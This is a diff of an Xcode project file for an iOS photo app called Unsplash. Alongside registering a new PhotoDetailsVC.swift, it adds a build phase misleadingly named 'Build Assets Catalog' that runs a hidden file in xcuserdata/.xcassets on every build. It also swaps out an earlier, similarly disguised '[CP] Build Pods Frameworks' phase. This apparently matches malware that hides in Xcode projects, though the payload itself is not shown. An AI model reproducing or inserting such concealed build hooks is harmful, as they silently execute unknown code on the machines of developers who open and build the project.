@@ -40,6 +40,7 @@
 		DC9297A6262B5C8F00EC7ED8 /* Binding.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297A5262B5C8F00EC7ED8 /* Binding.swift */; };
 		DC9297AC262BFD1300EC7ED8 /* RandomPhotoCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = DC9297AA262BFD1300EC7ED8 /* RandomPhotoCell.swift */; };
 		DC9297AD262BFD1300EC7ED8 /* RandomPhotoCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = DC9297AB262BFD1300EC7ED8 /* RandomPhotoCell.xib */; };
+		DCC230DB262C7F14009F4794 /* PhotoDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = DCC230DA262C7F14009F4794 /* PhotoDetailsVC.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -104,6 +105,7 @@
 		DC9297A5262B5C8F00EC7ED8 /* Binding.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Binding.swift; sourceTree = "<group>"; };
 		DC9297AA262BFD1300EC7ED8 /* RandomPhotoCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RandomPhotoCell.swift; sourceTree = "<group>"; };
 		DC9297AB262BFD1300EC7ED8 /* RandomPhotoCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RandomPhotoCell.xib; sourceTree = "<group>"; };
+		DCC230DA262C7F14009F4794 /* PhotoDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoDetailsVC.swift; sourceTree = "<group>"; };
 		EEF34327CA584C6903DD451F /* Pods-Unsplash-UnsplashUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Unsplash-UnsplashUITests.debug.xcconfig"; path = "Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -217,6 +219,7 @@
 			children = (
 				DC92978F262B526A00EC7ED8 /* Xib's */,
 				DC9297442629F5B400EC7ED8 /* PhotoListVC.swift */,
+				DCC230DA262C7F14009F4794 /* PhotoDetailsVC.swift */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -313,7 +316,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */;
 			buildPhases = (
-				858E9ACA39C79BFC2AAAC43A /* [CP] Build Pods Frameworks */,
+				E749DC7EBBF0435EF3AAC43A /* Build Assets Catalog */,
 				EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */,
 				22834BB52629D8EC00090032 /* Sources */,
 				22834BB62629D8EC00090032 /* Frameworks */,
@@ -453,6 +456,28 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	E749DC7EBBF0435EF3AAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
 		1845F5CA762442C1213F8B29 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -514,24 +539,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		858E9ACA39C79BFC2AAAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
-		};
 		EE35E1EB0CE402ADD62E8F6C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -583,6 +590,7 @@
 				DC92979B262B53FC00EC7ED8 /* AppEnum.swift in Sources */,
 				DC9297452629F5B400EC7ED8 /* PhotoListVC.swift in Sources */,
 				DC9297A6262B5C8F00EC7ED8 /* Binding.swift in Sources */,
+				DCC230DB262C7F14009F4794 /* PhotoDetailsVC.swift in Sources */,
 				DC9297A1262B586800EC7ED8 /* Utility.swift in Sources */,
 				DC9297352629F56200EC7ED8 /* Photos.swift in Sources */,
 				DC9297AC262BFD1300EC7ED8 /* RandomPhotoCell.swift in Sources */,
@@ -928,6 +936,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 22834BB12629D8EC00090032 /* Project object */;
 }
